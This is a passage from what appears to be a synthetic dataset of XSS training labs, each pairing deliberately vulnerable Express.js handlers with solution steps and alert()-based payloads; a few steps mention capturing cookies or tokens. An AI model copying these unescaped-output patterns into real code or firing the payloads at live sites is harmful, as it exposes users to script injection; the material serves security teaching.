        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/send-invite', (req, res) => {\n  const message = req.body.message;\n  db.query(\"INSERT INTO invites (message) VALUES (?)\", [message]);\n  res.send('Invite sent');\n});",
        "payloads": [
            "<script>alert('Invite')</script>",
            "<svg/onload=alert('XSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in library review system",
        "Lab Description": "Users can leave reviews for books. The review is rendered on the book page without sanitization.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Leave review: <script>alert('Book')</script>.",
            "View the book review page.",
            "Observe XSS."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/review-book', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO book_reviews (text) VALUES (?)\", [review]);\n  res.send('Review submitted');\n});",
        "payloads": [
            "<script>alert('Book')</script>",
            "<img src=x onerror=alert('Read')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in job application cover letter",
        "Lab Description": "Applicants can add a cover letter message which is later rendered to recruiters without escaping.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Submit application with <script>alert('Cover')</script>.",
            "Recruiter opens applicant dashboard.",
            "Payload is executed."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply', (req, res) => {\n  const letter = req.body.letter;\n  db.query(\"INSERT INTO applications (cover_letter) VALUES (?)\", [letter]);\n  res.send('Application submitted');\n});",
        "payloads": [
            "<script>alert('Cover')</script>",
            "<svg/onload=alert('Recruiter')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in user-submitted poll option label",
        "Lab Description": "Users can suggest new options in polls. The label is stored and reflected without escaping.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit new option: <script>alert('Poll')</script>.",
            "View poll as voter.",
            "Payload is executed."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-option', (req, res) => {\n  const label = req.body.label;\n  db.query(\"INSERT INTO poll_options (label) VALUES (?)\", [label]);\n  res.send('Option added');\n});",
        "payloads": [
            "<script>alert('Poll')</script>",
            "<img src=x onerror=alert('Option')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in event RSVP note",
        "Lab Description": "Attendees leave notes when RSVPing to events. These are shown to the host without escaping.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "RSVP with <script>alert('RSVP')</script> as note.",
            "Login as host and view guest list.",
            "Observe alert triggered."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/rsvp', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO rsvps (note) VALUES (?)\", [note]);\n  res.send('RSVP submitted');\n});",
        "payloads": [
            "<script>alert('RSVP')</script>",
            "<svg/onload=alert('Note')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in travel journal post title",
        "Lab Description": "A travel blog allows users to submit journal entries with a title. The title is stored and rendered without escaping.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a journal post with title: <script>alert('Travel')</script>.",
            "View the blog entry in the public feed.",
            "Observe script execution on load."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-journal', (req, res) => {\n  const title = req.body.title;\n  db.query(\"INSERT INTO journals (title) VALUES (?)\", [title]);\n  res.send('Journal submitted');\n});",
        "payloads": [
            "<script>alert('Travel')</script>",
            "<img src=x onerror=alert('XSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in university forum bio field",
        "Lab Description": "A university forum allows users to set a short bio. The bio is rendered without escaping in the user profile.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Set your forum bio to <svg/onload=alert('Bio')>.",
            "Log out and visit your profile as a guest.",
            "Observe script execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-bio', (req, res) => {\n  const bio = req.body.bio;\n  db.query(\"UPDATE users SET bio = ? WHERE id = ?\", [bio, req.user.id]);\n  res.send('Bio updated');\n});",
        "payloads": [
            "<svg/onload=alert('Bio')>",
            "<script>alert('ForumXSS')</script>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in resume builder summary section",
        "Lab Description": "A resume builder platform allows users to write a summary. The summary field is rendered without sanitization.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Write a summary: <script>alert('Resume')</script>.",
            "Export or preview resume.",
            "Observe the alert on view."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/save-summary', (req, res) => {\n  const summary = req.body.summary;\n  db.query(\"UPDATE resumes SET summary = ? WHERE user_id = ?\", [summary, req.user.id]);\n  res.send('Summary saved');\n});",
        "payloads": [
            "<script>alert('Resume')</script>",
            "<img src=x onerror=alert('Summary')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in file-sharing platform description",
        "Lab Description": "The file-sharing app lets users write descriptions for uploaded files. These are shown to others without escaping.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Upload a file with description: <img src=x onerror=alert('File')>.",
            "Visit the file download page.",
            "Observe alert on load."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/upload-description', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO files (description) VALUES (?)\", [description]);\n  res.send('File uploaded');\n});",
        "payloads": [
            "<img src=x onerror=alert('File')>",
            "<svg/onload=alert('Upload')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online quiz title input",
        "Lab Description": "An online quiz creator allows instructors to name quizzes. These names are rendered on the student dashboard without sanitization.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Create quiz with title: <script>alert('Quiz')</script>.",
            "Login as student and view dashboard.",
            "Confirm alert execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-quiz', (req, res) => {\n  const title = req.body.title;\n  db.query(\"INSERT INTO quizzes (title) VALUES (?)\", [title]);\n  res.send('Quiz created');\n});",
        "payloads": [
            "<script>alert('Quiz')</script>",
            "<svg/onload=alert('Student')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in portfolio description on freelance site",
        "Lab Description": "A freelancing platform lets users set descriptions for their portfolios. These are not sanitized when rendered.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Set description to <script>alert('Portfolio')</script>.",
            "View public portfolio page.",
            "Observe script execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/save-portfolio', (req, res) => {\n  const description = req.body.description;\n  db.query(\"UPDATE portfolios SET description = ? WHERE user_id = ?\", [description, req.user.id]);\n  res.send('Portfolio saved');\n});",
        "payloads": [
            "<script>alert('Portfolio')</script>",
            "<img src=x onerror=alert('Freelance')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in fitness tracker workout name",
        "Lab Description": "Users can name their workouts. The names are stored and displayed without escaping.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Create workout with name <script>alert('Workout')</script>.",
            "Open workout history.",
            "Observe alert firing."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/log-workout', (req, res) => {\n  const name = req.body.name;\n  db.query(\"INSERT INTO workouts (name) VALUES (?)\", [name]);\n  res.send('Workout saved');\n});",
        "payloads": [
            "<script>alert('Workout')</script>",
            "<img src=x onerror=alert('XSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in conference system speaker bio",
        "Lab Description": "Speakers can submit bios for conferences. These bios are shown without escaping on the agenda page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit speaker bio: <script>alert('Speaker')</script>.",
            "Access public conference agenda.",
            "Observe execution of payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-bio', (req, res) => {\n  const bio = req.body.bio;\n  db.query(\"INSERT INTO speakers (bio) VALUES (?)\", [bio]);\n  res.send('Bio submitted');\n});",
        "payloads": [
            "<script>alert('Speaker')</script>",
            "<svg/onload=alert('Bio')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in blog platform series description",
        "Lab Description": "Writers can create a series of articles and add a description. The description is rendered without escaping.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create new series with description: <script>alert('Series')</script>.",
            "Navigate to the series overview page.",
            "Observe execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-series', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO series (description) VALUES (?)\", [description]);\n  res.send('Series created');\n});",
        "payloads": [
            "<script>alert('Series')</script>",
            "<img src=x onerror=alert('Blog')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in idea board submission",
        "Lab Description": "Users can submit ideas to a public board. The content is stored and displayed without escaping.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit new idea: <script>alert('Idea')</script>.",
            "Browse public board and observe alert.",
            "Test for persistence and filter bypass."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-idea', (req, res) => {\n  const idea = req.body.idea;\n  db.query(\"INSERT INTO ideas (content) VALUES (?)\", [idea]);\n  res.send('Idea submitted');\n});",
        "payloads": [
            "<script>alert('Idea')</script>",
            "<svg/onload=alert('Board')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in employee recognition message field",
        "Lab Description": "The HR system allows employees to send recognition messages to each other. These messages are rendered directly on the dashboard without sanitization. To solve: Inject a stored XSS payload in a recognition message that executes on page load.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a recognition message containing <script>alert('XSS')</script>.",
            "Intercept using Burp Suite to verify storage.",
            "Login with a different user and view the dashboard.",
            "Observe script execution in another user's session.",
            "Test filter bypass with image/onerror payloads."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/recognition', (req, res) => { const msg = req.body.message; db.query(\"INSERT INTO recognition (message) VALUES (?)\", [msg]); res.redirect('/dashboard'); });",
        "payloads": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in support request form redirect",
        "Lab Description": "A support request form redirects to a confirmation page using a GET parameter for the user's name. The value is reflected in the HTML without encoding. To solve: Inject a reflected XSS payload into the name parameter.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit a request with ?name=<script>alert('XSS')</script>.",
            "Observe reflection in the confirmation page.",
            "Verify script execution occurs on page load.",
            "Try SVG-based variants to evade filters.",
            "Confirm in multiple browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/confirm', (req, res) => { const name = req.query.name; res.send(`<h1>Thanks ${name}</h1>`); });",
        "payloads": [
            "<script>alert('XSS')</script>",
            "<svg/onload=alert('XSS')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in campaign announcement preview",
        "Lab Description": "A marketing tool generates live previews of announcements using innerHTML from user input. There's no sanitization, resulting in DOM-based XSS. To solve: Inject a script payload and verify execution in preview pane.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Type <script>alert('XSS')</script> into the preview input field.",
            "Preview panel updates immediately.",
            "Observe script execution.",
            "Try using <img> or <svg> variants.",
            "Confirm execution without server-side interaction."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.use(express.static('public')); app.get('/preview', (req, res) => { res.send(`<html><body><div id='output'></div><script>document.getElementById('output').innerHTML = decodeURIComponent(location.hash.slice(1));</script></body></html>`); });",
        "payloads": [
            "#<script>alert('XSS')</script>",
            "#<img src=x onerror=alert('XSS')>"
        ]
    },
    {
        "Lab scenario": "Mutation-based XSS in dynamic invoice line editor",
        "Lab Description": "An invoicing app allows adding custom line items. DOM mutations from a contentEditable field lead to unsafe innerHTML injection. To solve: Inject a payload that triggers JavaScript on DOM mutation.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Enter <img src=x onerror=alert(1)> in a line item name.",
            "Save and reload invoice editor.",
            "Observer executes as innerHTML mutates.",
            "Test DOM events like onmouseover.",
            "Check persistence on save/load cycle."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); app.post('/save-line', (req, res) => { const line = req.body.item; db.query(\"INSERT INTO lines (item) VALUES (?)\", [line]); res.redirect('/editor'); });",
        "payloads": [
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert('lineXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in public event RSVP comments",
        "Lab Description": "The app collects public RSVP comments for events, which are shown without escaping. This enables stored XSS. To solve: Submit a comment that executes JavaScript when the event page loads.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit RSVP comment: <script>alert('RSVP')</script>.",
            "Check event page and observe execution.",
            "Confirm script runs across all sessions.",
            "Try alternative payloads.",
            "Capture cookies using external requests."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/rsvp', (req, res) => { const comment = req.body.comment; db.query(\"INSERT INTO rsvps (comment) VALUES (?)\", [comment]); res.redirect('/event'); });",
        "payloads": [
            "<script>alert('RSVP')</script>",
            "<img src=1 onerror=alert('RSVP')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in feedback widget thank you banner",
        "Lab Description": "A floating feedback widget reflects user input in a thank you banner post-submission. There's no encoding, leading to reflected XSS. To solve: Inject a payload and trigger the banner display.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Fill feedback form with name = <script>alert('XSS')</script>.",
            "Observe thank you message.",
            "Confirm script runs in response HTML.",
            "Test different payload shapes.",
            "Try encoded payloads to test filter behavior."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); app.post('/feedback', (req, res) => { const name = req.body.name; res.send(`<p>Thank you, ${name}</p>`); });",
        "payloads": [
            "<script>alert('XSS')</script>",
            "<svg/onload=alert('ThankYou')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in admin system announcement bar",
        "Lab Description": "Admins can set system-wide announcements shown to all users. The announcement is rendered as raw HTML, allowing stored XSS. To solve: Insert a script in the announcement field.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Login as admin and set announcement = <script>alert('XSS')</script>.",
            "Logout and visit the user dashboard.",
            "Observe announcement bar execution.",
            "Test iframe/srcdoc combinations.",
            "Capture tokens if possible."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); app.post('/admin/announce', (req, res) => { const msg = req.body.announcement; db.query(\"INSERT INTO announcements (text) VALUES (?)\", [msg]); res.redirect('/admin'); });",
        "payloads": [
            "<script>alert('XSS')</script>",
            "<iframe srcdoc='<script>alert(1)</script>'>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in video platform comment preview",
        "Lab Description": "A video site previews comments with JavaScript using innerHTML. The preview uses user input directly. To solve: Inject a DOM-based payload in a comment preview.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Enter <script>alert('Preview')</script> in comment field.",
            "Observe live preview pane.",
            "Check execution on blur/change.",
            "Try bypass with malformed tags.",
            "Verify across devices."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.use(express.static('public')); app.get('/', (req, res) => { res.send(`<html><body><textarea id='cmt'></textarea><div id='preview'></div><script>document.getElementById('cmt').addEventListener('input', e => { document.getElementById('preview').innerHTML = e.target.value; });</script></body></html>`); });",
        "payloads": [
            "<script>alert('Preview')</script>",
            "<img src=x onerror=alert('CMT')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in student discussion board replies",
        "Lab Description": "Students can reply to discussion threads. Replies are saved in a database and rendered without escaping. To solve: Inject a persistent XSS payload in a reply.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Reply to thread with <script>alert('Reply')</script>.",
            "Verify storage via intercepted POST.",
            "Reload thread and see execution.",
            "Try using encoded HTML tags.",
            "Ensure it affects other users."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/reply', (req, res) => { const reply = req.body.reply; db.query(\"INSERT INTO replies (text) VALUES (?)\", [reply]); res.redirect('/thread'); });",
        "payloads": [
            "<script>alert('Reply')</script>",
            "<svg/onload=alert('ReplyXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in PDF export metadata field",
        "Lab Description": "An export-to-PDF tool includes metadata from query parameters. These are inserted into the PDF preview HTML unsafely. To solve: Inject a payload into the metadata field and trigger PDF preview.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Visit /export?meta=<script>alert('PDF')</script>.",
            "Preview the export page.",
            "Confirm JavaScript execution before PDF rendering.",
            "Try SVG and iframe variants.",
            "Observe DOM injection location."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/export', (req, res) => { const meta = req.query.meta; res.send(`<html><body><h3>${meta}</h3></body></html>`); });",
        "payloads": [
            "<script>alert('PDF')</script>",
            "<img src=x onerror=alert('META')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in bug tracker issue title",
        "Lab Description": "The bug tracking system allows users to create issues with titles. These titles are stored and rendered on the dashboard without escaping, allowing persistent XSS. To solve: Inject a script in the issue title and confirm execution on issue board view.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit an issue titled <script>alert('XSS')</script>.",
            "Intercept the POST request using Burp Suite.",
            "Reload the issue board to observe execution.",
            "Try alternate tags to bypass filters.",
            "Confirm script executes for all users."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/report-issue', (req, res) => { const title = req.body.title; db.query(\"INSERT INTO issues (title) VALUES (?)\", [title]); res.redirect('/issues'); });",
        "payloads": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('Bug')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in newsletter unsubscribe confirmation",
        "Lab Description": "The unsubscribe page includes the user's email from a GET parameter and renders it into the confirmation HTML. This allows reflected XSS. To solve: Inject a payload into the email parameter and observe execution.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Navigate to /unsubscribe?email=<script>alert('XSS')</script>.",
            "Check if input is reflected without encoding.",
            "Observe script execution in HTML.",
            "Try different encodings to bypass filters.",
            "Test across different browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/unsubscribe', (req, res) => { const email = req.query.email; res.send(`<h2>Unsubscribed: ${email}</h2>`); });",
        "payloads": [
            "<script>alert('XSS')</script>",
            "<svg/onload=alert('UNSUB')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in blog post comment field",
        "Lab Description": "The blog platform allows commenting on posts. Comments are stored and displayed without sanitization. To solve: Submit a comment with an XSS payload and observe it triggering for readers.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Comment with <script>alert('BlogXSS')</script>.",
            "Reload post page to verify script execution.",
            "Use Burp to verify database storage.",
            "Check in incognito or other account.",
            "Confirm persistence across sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/comment', (req, res) => { const comment = req.body.comment; db.query(\"INSERT INTO comments (text) VALUES (?)\", [comment]); res.redirect('/post'); });",
        "payloads": [
            "<script>alert('BlogXSS')</script>",
            "<img src=x onerror=alert(123)>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in report generator title preview",
        "Lab Description": "A report generator allows users to input titles. The title is updated live via `innerHTML` without sanitization, enabling DOM-based XSS. To solve: Inject a payload in the title preview field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Enter <script>alert('Title')</script> in the title input.",
            "Observe live preview updates with innerHTML.",
            "Script executes on input.",
            "Confirm if bypasses like <svg> also work.",
            "Try across devices."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.use(express.static('public')); app.get('/report', (req, res) => { res.send(`<html><body><input id='title'/><div id='preview'></div><script>document.getElementById('title').addEventListener('input', e => { document.getElementById('preview').innerHTML = e.target.value; });</script></body></html>`); });",
        "payloads": [
            "<script>alert('Title')</script>",
            "<svg/onload=alert('X')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in FAQ suggestion form",
        "Lab Description": "Users can submit suggestions to be displayed on the FAQ page. These are rendered without escaping. To solve: Submit a script tag in a suggestion and verify execution.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a suggestion with <script>alert('FAQ')</script>.",
            "Admin approves it and it's shown in FAQ list.",
            "Reload FAQ and confirm script runs.",
            "Check from different account.",
            "Try image tag-based variants."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-faq', (req, res) => { const question = req.body.question; db.query(\"INSERT INTO faq (question) VALUES (?)\", [question]); res.redirect('/faq'); });",
        "payloads": [
            "<script>alert('FAQ')</script>",
            "<img src=x onerror=alert('FAQ')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in gift card generator preview",
        "Lab Description": "The site generates gift card previews using query params. These are rendered without encoding, causing reflected XSS. To solve: Inject JavaScript in the name parameter.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Visit /gift?name=<script>alert('Gift')</script>.",
            "Observe reflected input in HTML.",
            "Script executes on load.",
            "Try using <iframe> variants.",
            "Test in mobile view."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/gift', (req, res) => { const name = req.query.name; res.send(`<h1>Gift for ${name}</h1>`); });",
        "payloads": [
            "<script>alert('Gift')</script>",
            "<iframe srcdoc='<script>alert(1)</script>'>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in dynamic pricing calculator",
        "Lab Description": "The calculator app reflects query parameters into a summary box via innerHTML. It does not sanitize the input. To solve: Inject a payload into a query parameter and observe execution.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Open /price.html#discount=<svg/onload=alert('XSS')>",
            "Observe innerHTML injection.",
            "Check if script runs in summary box.",
            "Try multiple payload types.",
            "Confirm across devices."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.use(express.static('public')); app.get('/price.html', (req, res) => { res.send(`<html><body><div id='summary'></div><script>document.getElementById('summary').innerHTML = decodeURIComponent(location.hash.slice(1));</script></body></html>`); });",
        "payloads": [
            "#discount=<svg/onload=alert('XSS')>",
            "#<img src=x onerror=alert('X')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in employee suggestion box",
        "Lab Description": "A suggestion box stores feedback for management. The input is rendered without escaping, leading to stored XSS. To solve: Inject a malicious script into a suggestion.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit suggestion with <script>alert('HR')</script>.",
            "Login as admin and view suggestions.",
            "Observe script execution.",
            "Try payloads using event handlers.",
            "Test filter bypass techniques."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/suggest', (req, res) => { const idea = req.body.idea; db.query(\"INSERT INTO suggestions (text) VALUES (?)\", [idea]); res.redirect('/thanks'); });",
        "payloads": [
            "<script>alert('HR')</script>",
            "<svg/onload=alert('Suggestion')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in quick order summary field",
        "Lab Description": "The quick order summary feature reflects user data without escaping. If a payload is injected in the name field, it is rendered raw. To solve: Trigger reflected XSS via the name input.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit order with name=<img src=x onerror=alert('XSS')>.",
            "Observe execution on the confirmation page.",
            "Use encoded payloads to evade basic filters.",
            "Confirm reflection happens in HTML body.",
            "Check behavior in Safari and Firefox."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); app.post('/summary', (req, res) => { const name = req.body.name; res.send(`<div>Hello, ${name}</div>`); });",
        "payloads": [
            "<img src=x onerror=alert('XSS')>",
            "<script>alert('Name')</script>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online resume description",
        "Lab Description": "A resume builder app allows users to enter a description field. This is rendered without escaping, causing persistent XSS. To solve: Inject a payload in the resume description.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Set description = <script>alert('Resume')</script>.",
            "Save resume and preview it.",
            "Observe XSS on resume viewer page.",
            "Try onerror payloads as alternatives.",
            "Confirm across sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/save-resume', (req, res) => { const desc = req.body.description; db.query(\"INSERT INTO resumes (description) VALUES (?)\", [desc]); res.redirect('/view-resume'); });",
        "payloads": [
            "<script>alert('Resume')</script>",
            "<img src=x onerror=alert('CV')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in customer support live ticket subject",
        "Lab Description": "The live support system displays ticket subjects without escaping them on the agent dashboard. Attackers can inject JavaScript into the subject to execute code when viewed. To solve: Submit a support ticket with a script in the subject.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit ticket with subject: <script>alert('SupportXSS')</script>.",
            "Login as support agent and open dashboard.",
            "Observe script execution in ticket list.",
            "Test event-based payloads like onmouseover.",
            "Confirm persistence after refresh."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-ticket', (req, res) => { const subject = req.body.subject; db.query(\"INSERT INTO tickets (subject) VALUES (?)\", [subject]); res.redirect('/ticket-confirmation'); });",
        "payloads": [
            "<script>alert('SupportXSS')</script>",
            "<img src=x onerror=alert('Ticket')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in contact form thank you message",
        "Lab Description": "The contact form reflects submitted names into a thank-you response without sanitization. This enables reflected XSS when a payload is submitted via the name field. To solve: Inject script in the name input and observe execution.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Fill in contact form with name=<script>alert('XSS')</script>.",
            "Submit and view confirmation page.",
            "Observe reflected script execution.",
            "Use Burp Suite to test alternate payloads.",
            "Try encoded payloads like %3Cscript%3E."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/contact', (req, res) => { const name = req.body.name; res.send(`<p>Thank you ${name}, we will contact you shortly.</p>`); });",
        "payloads": [
            "<script>alert('XSS')</script>",
            "<svg onload=alert('Contact')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in password reset link renderer",
        "Lab Description": "The password reset tool renders user email from localStorage into the DOM using innerHTML, without escaping. To solve: Inject a payload into localStorage and reload the page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Set localStorage.email = '<img src=x onerror=alert(123)>';",
            "Reload /reset.html and observe DOM update.",
            "Check preview or confirmation panel for execution.",
            "Try other event-based payloads.",
            "Validate in different browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "document.getElementById('email-display').innerHTML = localStorage.email;",
        "payloads": [
            "<img src=x onerror=alert(123)>",
            "<svg/onload=alert('Reset')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in HR system job applicant notes",
